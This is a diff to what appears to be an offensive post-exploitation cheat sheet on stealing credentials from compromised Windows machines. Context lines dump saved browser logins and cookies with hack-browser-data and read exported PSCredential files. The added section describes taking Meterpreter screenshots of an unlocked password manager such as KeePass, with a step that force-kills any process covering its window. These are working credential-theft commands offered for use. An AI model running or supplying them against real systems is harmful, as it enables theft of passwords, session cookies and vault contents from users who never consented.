@@ -23,3 +23,11 @@ type C:\Users\<user>\Documents\*.cred          # Export-Clixml'd PSCredential
 hack-browser-data.exe -b <chrome|edge|opera-gx> -d . -p "<profile-path>"   # dumps saved logins/cookies
 ```
 
+If a Meterpreter/C2 session has GUI access and `Get-Process`/`tasklist` shows a password manager (KeePass, etc.) already running, a live screenshot can leak whatever's currently unlocked on screen — cheaper than cracking the vault file, and worth trying before giving up on a `.kdbx` that resists `john`/`hashcat`:
+```
+screenshot
+# if another process (an open dialog, a competing shell) is covering the window, kill it and re-shoot:
+Stop-Process -Name "<blocking-process>" -Force
+screenshot
+```
+
